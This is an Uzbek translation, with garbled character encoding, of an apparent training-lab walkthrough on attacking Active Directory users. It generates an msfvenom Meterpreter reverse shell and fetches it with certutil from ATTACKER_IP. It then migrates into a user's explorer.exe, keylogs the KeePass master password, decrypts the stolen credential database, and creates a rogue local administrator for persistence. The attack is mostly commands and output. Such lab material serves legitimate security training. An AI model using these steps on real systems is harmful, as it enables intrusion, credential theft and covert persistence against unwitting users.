
# â­ **AD User Targeting & Credential Harvesting â€” Oâ€˜zbekcha tarjima**

Biz hozirgacha ekspluatatsiya jarayonida anchagina oldinga oâ€˜tdik. Endi bizda ish stansiyalari va serverlar ustidan **toâ€˜liq administratorlik** mavjud. Yaâ€™ni, Tier 1 va Tier 2 tizimlarning deyarli hammasida post-ekspluatatsiya ishlarini bajarishimiz mumkin.

Ammo biz **yanada chuqurroq kirishni** istaymiz. Bu keyingi vazifa post-ekspluatatsiyaga oâ€˜xshaydi, lekin koâ€˜pincha ekspluatatsiya davomida ham foydali boâ€˜ladi â€” to toâ€˜gâ€˜ri pozitsiyaga yetgunimizcha.

Endi maqsadimiz **AD foydalanuvchilarini nishonga olish**.

---

# ğŸ‘¤ **Foydalanuvchilar va ularning xatti-harakatlari**

> â€œKelajak fabrikasida atigi ikki xodim boâ€˜ladi: bir odam va bir it. Odam â€” itni ovqatlantirish uchun. It esa â€” odam hech narsaga tegmasligi uchun.â€
> â€” *Warren Bennis*

Afsuski, **insonlar koâ€˜pincha xavfsizlik zanjiridagi eng zaif halqa** hisoblanadi. Fikrlab koâ€˜ring:

* Yengil parollar
* Ortiqcha huquqlar berish
* Keraksiz ruxsatlar
* Xavfsizlik madaniyati pastligi

AD ekspluatatsiyasida user targeting â€” juda muhim.

Bu vazifada biz ikki narsaga eâ€™tibor qaratamiz:

1. **Credential Management** â€“ foydalanuvchilar parollarni qanday saqlashadi.
2. **Keylogging** â€“ foydalanuvchi tizimdan qanday foydalanayotganini kuzatish.

---

# ğŸ” **Credential qidirish**

Biz THMSERVER1â€™ni ekspluatatsiya qildik â€” endi foydalanuvchi kataloglarini koâ€˜zdan kechirish va foydali fayllarni topish vaqti.

Izlanishlar natijasida bir **.kdbx** faylini topasiz.

Google orqali bilamizki, bu **KeePass credential database**.

Biz uni Meterpreter orqali yuklab olishimiz mumkin:

```
meterpreter> download FILE.kdbx
```

Ammo muammo:
â¡ï¸ Bu baza **parol bilan shifrlangan**.
â¡ï¸ KeePass ishlatadigan odamlar odatda kuchli master password ishlatadi â€” buzish qiyin.

Demak, bizga **foydalanuvchi bu bazani ochayotgan paytda uning parolini kuzatish** kerak boâ€˜ladi.

---

# âš ï¸ **SYSTEM darajasi baâ€™zan keraksiz darajada baland boâ€˜ladi**

Meterpreter ichida **built-in keylogger** bor. Juda foydali.

Ammo hozirgi shell â†’ **SYSTEM kontekstida** ishlayapti.
SYSTEM hech narsa terib oâ€˜tirmaydi â†’ keylogger hech narsa ushlamaydi.

Demak, biz keyloggerni foydalanuvchi nomidan yuritishimiz kerak.

### ğŸ¯ Yechim: **process migration**

Meterpreter ekspluatatsiya qilgandan soâ€˜ng, biz:

1. Foydalanuvchi sessiyasidagi jarayonlarni koâ€˜ramiz
2. Masalan `explorer.exe`
3. Oâ€˜sha jarayonga migratsiya qilamiz

---

# ğŸ§¨ **Meterpreter shell olish**

Agar qayta eslatma kerak boâ€˜lsa, shell olish uchun msfvenom dan foydalanamiz:

### Payload yaratish:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT=LISTEN_PORT -f psh -o shell.ps1
```

### Listener yaratish:

```bash
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT LISTEN_PORT; exploit"
```

### Shellni yuklab olish:

```cmd
certutil.exe -urlcache -split -f http://ATTACKER_IP/shell.ps1
```

Shell ishga tushadi â†’ Meterpreter ochiladi.

---

# ğŸ§‘â€ğŸ’¼ **Foydalanuvchining processlarini koâ€˜rish**

```bash
meterpreter> ps | grep "explorer"
```

Misol natija:

```
PID   Name          User
3612  explorer.exe  THMSERVER1\trevor.local
```

Agar explorer topilmasa:

1. `trevor.local` parolini oâ€˜zgartirasiz
2. `auto-login.ps1` orqali avtomatik login yoqasiz
3. Serverni qayta yuklaysiz
4. Sessiya paydo boâ€˜ladi

---

# ğŸ”„ **Migration bajarish**

```bash
meterpreter> migrate 3612
```

Tasdiqlash:

```bash
meterpreter> getuid
Server username: THMSERVER1\trevor.local
```

Zoâ€˜r â€” endi foydalanuvchi kontekstidamiz.

---

# âŒ¨ï¸ **Keylogger ishga tushirish**

```bash
meterpreter> keyscan_start
```

Kutamizâ€¦

Soâ€˜ngra:

```bash
meterpreter> keyscan_dump
```

Misol natija:

```
keep<CR>
<Shift>Passwordpasswordpassword<CR>
```

Bu koâ€˜pincha KeePass master password boâ€˜ladi. Endi .kdbx faylini ochish mumkin.

---

# ğŸ”“ **KeePass bilan credentiallarni olish**

AttackBoxâ€™da KeePass allaqachon oâ€˜rnatilgan.

Agar oâ€˜zingizning VMâ€™da boâ€˜lsangiz:

```bash
sudo apt install keepassx
```

Yoki qoâ€˜lda yuklab olishingiz mumkin.

Keyin:

* `.kdbx` faylni meterpreter orqali yuklab olasiz
* KeePassâ€™da ochasiz
* Parol sifatida keyloggerdan olingan parolni kiritasiz

ğŸ’¡ **Agar Kaliâ€™da ishlatsangiz, faylning egaligini kali userâ€™iga oâ€˜tkazing**, aks holda bazani lock qilib qoâ€˜yishi mumkin.

---

# ğŸ” Qoâ€˜shimcha maslahat: hozirdayoq persistence qoâ€˜shing

Hali persistence mavzusiga oâ€˜tmagan boâ€˜lsak ham, hozir yaxshi vaqt:

* THMSERVER1 ichida yangi lokal foydalanuvchi yarating
* Uni local administrators guruhiga qoâ€˜shing

Bu sizga mustahkam foothold beradi.
